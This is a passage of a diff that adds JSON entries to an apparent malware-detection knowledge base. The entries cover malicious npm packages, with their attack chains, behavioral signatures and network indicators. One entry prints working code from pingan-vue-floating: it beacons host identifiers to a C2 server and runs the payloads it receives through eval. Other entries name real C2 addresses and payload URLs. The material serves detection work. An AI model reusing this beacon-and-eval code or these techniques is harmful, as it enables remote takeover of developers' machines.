+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_4",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4164586663246155,
+              "code_similarity": 0.38576552271842957,
+              "behavior_similarity": 0.447151780128479,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "function heartbeat(){\n    const requestData = {\n        hostname: os.hostname(),\n        uuid:machineIdSync({original: true}),\n        os:os.platform(),\n    };\n    sendRequest(url+'/api/index',aesEncrypt(JSON.stringify(requestData)))\n    const task = {\n        uuid:machineIdSync({original: true}),\n    }\n    sendRequest(url+'/api/captcha',aesEncrypt(JSON.stringify(task))).then(result => {\n        try{\n            if (result !== undefined) {\n                const data = JSON.parse(result);\n                const decodedData = Buffer.from(data.code, 'base64').toString();\n                eval(decodedData)\n            }\n        }catch (error){\n        }\n    });\n}",
+                "code_behavior": "Every 45 seconds at runtime, the code collects host and machine identifiers, encrypts them, and sends them to the C2 server; it then receives an encrypted payload, decodes and executes it using eval, enabling remote code execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Periodic exfiltration of host info and execution of remote, attacker-supplied code is highly malicious and enables full compromise of the victim system.",
+                  "violated_expectations": "Legitimate packages do not beacon to remote servers or execute arbitrary code received from the network.",
+                  "similar_legitimate_use": "Heartbeat mechanisms are used in legitimate monitoring agents, but never to execute arbitrary code from untrusted sources.",
+                  "key_indicators": [
+                    "periodic network beaconing to C2 server",
+                    "encrypted payload delivery and execution via eval",
+                    "exfiltration of host and machine identifiers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (daemonized by pm2)",
+                  "file_location": "app.js (heartbeat function)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102816_369953_snippet_1",
+              "source_package": "noblox.js-async, noblox.js-thread, noblox.js-api, noblox.js-threads (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102816_369953/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41442519426345825,
+              "code_similarity": 0.4093290865421295,
+              "behavior_similarity": 0.419521301984787,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "(function(_0x411d81,_0x100026){function ... // heavily obfuscated code with nonsensical Chinese characters",
+                "code_behavior": "During postinstall, the code executes heavily obfuscated JavaScript that initiates network requests to attacker-controlled infrastructure, downloads and executes additional payloads, manipulates the filesystem and registry, and sets up further stages of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of heavily obfuscated code in a postinstall script is a strong indicator of malicious intent, especially when it initiates network connections and system modifications immediately after installation.",
+                  "violated_expectations": "Legitimate npm packages rarely use obfuscation in postinstall scripts and do not perform remote code execution or system-level changes during installation.",
+                  "similar_legitimate_use": "Some legitimate packages use postinstall scripts for setup or telemetry, but not for obfuscated remote code execution or system modification.",
+                  "key_indicators": [
+                    "Heavily obfuscated JavaScript with nonsensical characters",
+                    "Obfuscated logic to hide true intent",
+                    "Network requests to attacker-controlled infrastructure",
+                    "Execution of downloaded binaries",
+                    "System and registry modifications"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "postinstall.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars",
+                    "registry"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "noblox.js-async, noblox.js-thread, noblox.js-api, noblox.js-threads",
+                  "package_manager": "npm",
+                  "package_versions": "All versions published by user 'bicholassancheck14' (e.g., 6.6.9 for noblox.js-async)",
+                  "why_malicious": "These packages impersonate the legitimate 'noblox.js' library using brandjacking, combosquatting, and starjacking techniques to appear trustworthy. They contain heavily obfuscated malicious code in postinstall scripts that downloads and executes additional malware, steals sensitive data such as Discord tokens, disables security software, establishes persistence via registry hijacking, and deploys remote access trojans like QuasarRAT."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs a malicious npm package mimicking noblox.js.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious postinstall script execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Obfuscated postinstall.js script executes, downloading and running additional payloads from the attacker's GitHub repository.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "System compromise and further malware deployment"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware disables antivirus protections (Malwarebytes, Windows Defender) to evade detection.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Unrestricted malware operation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware establishes persistence by hijacking the Windows Settings app via registry modification.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Long-term access on infected system"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malware searches for and exfiltrates Discord tokens and other sensitive data via Discord webhook.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Credential theft and data exfiltration"
+                  },
+                  {
+                    "step": 6,
+                    "action": "QuasarRAT is deployed, granting remote access to the attacker.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Full remote control of the victim system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Heavily obfuscated JavaScript in postinstall scripts",
+                    "Network requests to GitHub for executable downloads during installation",
+                    "Base64-decoded URLs used for payload delivery",
+                    "Registry modifications targeting ms-settings handler for persistence",
+                    "Disabling or excluding antivirus protections via PowerShell or reg.exe",
+                    "Harvesting and exfiltration of Discord tokens via webhooks"
+                  ],
+                  "file_indicators": [
+                    "Presence of postinstall.js with obfuscated code",
+                    "Executables saved in C:\\WindowsApi\\nodeapi_*.exe",
+                    "References to Client-built.exe and cmd.exe downloaded from remote sources",
+                    "Registry key HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command modified"
+                  ],
+                  "network_indicators": [
+                    "Connections to github.com/aspdasdksa2/callback/raw/main/Client-built.exe",
+                    "Connections to github.com/aspdasdksa2/callback/raw/main/cmd.exe",
+                    "Outbound requests to Discord webhooks (discord.com/api/webhooks/...)"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts containing obfuscated or base64-encoded code, especially those making network requests to GitHub or Discord. Flag any package that downloads and executes binaries from remote sources, modifies registry keys for persistence (such as ms-settings handler), or disables antivirus protections via PowerShell or registry changes. Look for the creation of suspicious executables in system directories (e.g., C:\\WindowsApi\\nodeapi_*.exe) and outbound connections to known malicious infrastructure, including Discord webhooks and specific GitHub repositories."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
